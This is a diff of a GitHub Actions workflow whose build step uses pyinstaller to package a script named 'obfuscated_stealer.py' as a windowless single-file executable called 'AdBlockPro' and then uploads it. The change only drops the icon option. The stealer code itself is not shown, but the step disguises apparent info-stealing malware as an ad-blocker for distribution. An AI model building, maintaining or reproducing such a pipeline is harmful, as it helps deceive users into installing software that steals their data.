@@ -27,7 +27,7 @@ jobs:
     
     - name: Build executable
       run: |
-        pyinstaller --onefile --noconsole --name AdBlockPro --icon=icon32.png obfuscated_stealer.py
+        pyinstaller --onefile --noconsole --name AdBlockPro  obfuscated_stealer.py
     
     - name: Upload executable
       uses: actions/upload-artifact@v4
